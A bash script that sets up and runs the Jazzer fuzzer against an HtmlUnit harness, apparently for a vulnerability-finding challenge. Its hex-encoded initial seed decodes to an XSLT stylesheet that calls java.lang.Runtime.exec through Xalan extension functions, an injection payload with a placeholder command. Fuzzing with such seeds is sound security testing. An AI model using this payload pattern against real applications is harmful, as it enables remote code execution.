die () {
    echo >&2 "$@"
    exit 1
}

if ! command -v jq &> /dev/null; then
    echo "jq not found, installing"
    sudo apt update
    sudo apt install -y jq || die "Failed to install jq"
fi
sudo apt install -y parallel || die "Failed to install parallel"
if ! command -v ts &> /dev/null; then
    sudo apt update
    sudo apt install -y moreutils || die "Failed to install ts"
fi
if ! command -v java &> /dev/null; then
  sudo apt update
  sudo apt install -y curl || die "Failed to install curl"
  export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
  export JVM_LD_LIBRARY_PATH=$JAVA_HOME/lib/server
  export PATH=$PATH:$JAVA_HOME/bin
  echo "Installing Modified JAVA" && \
    if ! test -f /openlogic-openjdk-17.0.11+9-linux-x64.tar.gz; then echo "from the internet...";curl -L -O https://builds.openlogic.com/downloadJDK/openlogic-openjdk/17.0.11+9/openlogic-openjdk-17.0.11+9-linux-x64.tar.gz;else echo "from cache";cp /openlogic-openjdk-17.0.11+9-linux-x64.tar.gz .;fi && \
      mkdir -p $JAVA_HOME && \
      tar -xz --strip-components=1 -f openlogic-openjdk-17.0.11+9-linux-x64.tar.gz --directory $JAVA_HOME && \
      update-alternatives --install /usr/bin/java java ${JAVA_HOME}/bin/java 1 && \
      update-alternatives --set java ${JAVA_HOME}/bin/java && \
      rm -f openlogic-openjdk-17.0.11+9-linux-x64.tar.gz && \
      rm -rf $JAVA_HOME/lib/src.zip || die "Failed to install JAVA"
fi

WORKDIR=`realpath ./fuzz`
rm -rf $WORKDIR
mkdir -p $WORKDIR

rm -rf log-find-sink json-result-sink
mkdir -p log-find-sink json-result-sink
rm -rf artifact-sink
mkdir -p artifact-sink
mkdir -p ${WORKDIR}/artifacts/
mkdir -p ${WORKDIR}/reproducer/
mkdir -p ${WORKDIR}/corpus_dir/

if [ $# -ge 1 ]; then
  # each arg is a corpus directory
  for corpus_dir in "$@"; do
    echo "Copying $corpus_dir to corpus_dir"
    [ -d "$corpus_dir" ] || die "Corpus directory not found"
    cp -r $corpus_dir ${WORKDIR}/corpus_dir/
    if [[ "$corpus_dir" == *"fuzz/oldjazzer-"* || "$corpus_dir" == *"fuzz/olddirectedjazzer-"* || "$corpus_dir" == *"fuzz/aixccjazzer-"* ]]; then
      echo Transforming corpus for $corpus_dir
      #find ${WORKDIR}/corpus_dir/ -type f -exec sh -c "tail -c +6 {} > {}.tmp && mv {}.tmp {}" \;
      find ${WORKDIR}/corpus_dir/ -type f | parallel --progress 'tail -c +6 {} > {}.tmp && mv {}.tmp {}'
    fi
  done
fi

# beep cpv1
hex_data="3c21444f43545950452068746d6c3e0a3c68746d6c3e0a3c686561643e0a202020203c7469746c653e58534c54205472616e73666f726d6174696f6e3c2f7469746c653e0a3c2f686561643e0a3c626f64793e0a202020203c6469762069643d226f7574707574223e3c2f6469763e0a202020203c7363726970743e0a202020202020202066756e6374696f6e206c6f6164584d4c537472696e672874787429207b0a20202020202020202020202076617220706172736572203d206e657720444f4d50617273657228293b0a20202020202020202020202072657475726e207061727365722e706172736546726f6d537472696e67287478742c2022746578742f786d6c22293b0a20202020202020207d0a0a20202020202020207661722078736c54657874203d20600a20202020202020203c78736c3a7374796c6573686565742076657273696f6e3d22312e302220786d6c6e733a78736c3d22687474703a2f2f7777772e77332e6f72672f313939392f58534c2f5472616e73666f726d2220786d6c6e733a72743d22687474703a2f2f786d6c2e6170616368652e6f72672f78616c616e2f6a6176612f6a6176612e6c616e672e52756e74696d652220786d6c6e733a6f623d22687474703a2f2f786d6c2e6170616368652e6f72672f78616c616e2f6a6176612f6a6176612e6c616e672e4f626a656374223e0a20202020202020202020203c78736c3a74656d706c617465206d617463683d222f223e0a202020202020202020202020203c78736c3a7661726961626c65206e616d653d2272746f626a656374222073656c6563743d2272743a67657452756e74696d652829222f3e0a202020202020202020202020203c78736c3a7661726961626c65206e616d653d2270726f63657373222073656c6563743d2272743a65786563282472746f626a6563742c2761616161612729222f3e0a202020202020202020202020203c78736c3a7661726961626c65206e616d653d2270726f63657373537472696e67222073656c6563743d226f623a746f537472696e67282470726f6365737329222f3e0a202020202020202020202020203c7370616e3e3c78736c3a76616c75652d6f662073656c6563743d222470726f63657373537472696e67222f3e3c2f7370616e3e0a20202020202020202020203c2f78736c3a74656d706c6174653e0a2020202020202020203c2f78736c3a7374796c6573686565743e0a2020202020202020603b0a0a202020202020202076617220786d6c54657874203d20223c733e3c2f733e223b0a0a20202020202020207661722078736c446f63203d206c6f6164584d4c537472696e672878736c54657874293b0a202020202020202076617220786d6c446f63203d206c6f6164584d4c537472696e6728786d6c54657874293b0a0a20202020202020206966202878736c446f632e646f63756d656e74456c656d656e742e6e6f64654e616d65203d3d3d20227061727365726572726f7222207c7c20786d6c446f632e646f63756d656e74456c656d656e742e6e6f64654e616d65203d3d3d20227061727365726572726f722229207b0a202020202020202020202020646f63756d656e742e676574456c656d656e744279496428226f757470757422292e696e6e657248544d4c203d20224572726f722070617273696e6720584d4c2e223b0a20202020202020207d20656c7365207b0a2020202020202020202020207661722078736c7450726f636573736f72203d206e65772058534c5450726f636573736f7228293b0a20202020202020202020202078736c7450726f636573736f722e696d706f72745374796c6573686565742878736c446f63293b0a20202020202020202020202076617220726573756c74446f63756d656e74203d2078736c7450726f636573736f722e7472616e73666f726d546f467261676d656e7428786d6c446f632c20646f63756d656e74293b0a202020202020202020202020646f63756d656e742e676574456c656d656e744279496428226f757470757422292e617070656e644368696c6428726573756c74446f63756d656e74293b0a20202020202020207d0a202020203c2f7363726970743e0a3c2f626f64793e0a3c2f68746d6c3e0a"
echo $hex_data | xxd -r -p > ${WORKDIR}/corpus_dir/initial_seed

#  --instrumentation_includes="org.apache.activemq.openwire.v10.**" \
#  --instrumentation_includes="org.apache.activemq.openwire.v10.**" \
#  --instrumentation_excludes="com.jprofiler.**" \
#  --instrumentation_excludes="**" \

#-dict=${WORKDIR}/fuzz.dict 

JAZZER_PATH=./classpath/jazzer
#JAZZER_PATH=./classpath/atl-jazzer
#JAZZER_PATH=./classpath/atl-jazzer-directed
#JAZZER_PATH=./classpath/atl-jazzer-new
#JAZZER_PATH=./classpath/atl-jazzer-directed-new

TARGET_CLASS=com.aixcc.htmlunit.harnesses.one.HtmlunitOne

#  -max_total_time=300 \

# N.B. powermock and mockito-all are excluded from the classpath to make Jazzer happy
#   This conflict is found by fuzzing cp-java-geonetwork
TARGET_CLASSPATH=${JAZZER_PATH}:$(find "./cp" -name "*.jar" | grep -v -e 'powermock' -e 'mockito-all' | tr '\n' ':'; find "${JAZZER_PATH}" -name "*.jar" | tr '\n' ':')

for CPV in HtmlunitOneCPVOne
do

  export JAZZER_SINK_MODE=${CPV}

  sink_json=json-result-sink/${CPV}.json

  ${JAZZER_PATH}/jazzer \
    --trace=none \
    --custom_hook_includes="some.package.names.never.exist" \
    --instrumentation_includes="some.package.names.never.exist" \
  	--reproducer_path=${WORKDIR}/reproducer \
  	--agent_path=${JAZZER_PATH}/jazzer_standalone_deploy.jar \
  	--cp=${TARGET_CLASSPATH} \
  	--target_class=${TARGET_CLASS} \
  	--jvm_args=-Djdk.attach.allowAttachSelf=true:-XX\:+StartAttachListener:-Xmx20000m:-XX\:MaxPermSize --keep_going=1000 --disabled_hooks=com.code_intelligence.jazzer.sanitizers.IntegerOverflow \
  	-use_value_profile=1 -rss_limit_mb=20000 -artifact_prefix=${WORKDIR}/artifacts/ -reload=1 -dict=./fuzz.dict -close_fd_mask=1 -timeout=300 -keep_seed=1 ${WORKDIR}/corpus_dir \
    -runs=0 \
    2>&1 | \
    stdbuf -e 0 -o 0 ts "%s" | \
    python3 -u ./jazzer_postprocessing.py -o $sink_json 2>&1 | tee log-find-sink/${CPV}.log
  
  echo Jazzer ret code is ${PIPESTATUS[0]}

  n=0
  jq -r '.fuzz_data.log_triage_crash_over_time[] | select(.[1]=="SINKPOINT" and (.[2] | type == "string" and contains("'${CPV}'"))) | .[3]' $sink_json | while read f;
  do
    cp ${WORKDIR}/artifacts/$f artifact-sink/sink-${CPV}-${n}
    n=$((n+1))
  done
done
